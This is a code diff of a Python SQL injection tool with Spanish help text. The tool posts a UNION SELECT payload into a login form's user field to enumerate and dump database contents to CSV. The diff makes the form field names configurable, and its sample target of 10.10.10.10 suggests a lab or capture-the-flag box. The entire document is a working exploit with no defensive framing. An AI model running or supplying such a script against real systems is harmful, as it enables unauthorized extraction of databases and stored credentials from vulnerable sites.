@@ -29,17 +29,25 @@ import csv
 import re
 from urllib.parse import urlparse
 
-parser = argparse.ArgumentParser()
-parser.add_argument("--url", required=True)
-parser.add_argument("--max", type=int, default=10)
+parser = argparse.ArgumentParser(description="Dump SQL vía SQLi (UNION SELECT), con campos personalizables y salida CSV.")
+parser.add_argument("--url", required=True, help="URL del formulario vulnerable, ej: http://10.10.10.10/login")
+parser.add_argument("--max", type=int, default=10, help="Máximo de iteraciones por nivel")
+parser.add_argument("--userfield", default="username", help="Nombre del campo de usuario")
+parser.add_argument("--passfield", default="password", help="Nombre del campo de contraseña")
 args = parser.parse_args()
 
 url = args.url
 max_enum = args.max
+user_field = args.userfield
+pass_field = args.passfield
 
 def extract(query):
   payload = f"' UNION SELECT 1,({query}),3 -- -"
-  r = requests.post(url, data={"username": payload, "password": "x"})
+  data = {
+    user_field: payload,
+    pass_field: "x"
+  }
+  r = requests.post(url, data=data)
   m = re.search(r"([a-zA-Z0-9_@\-.]+)", r.text)
   return m.group(1) if m else None
 
@@ -76,4 +84,4 @@ for db_i in range(max_enum):
         break
 
 csvf.close()
-print(f"\n CSV guardado en {csv_file}")
+print(f"\nCSV guardado en {csv_file}")
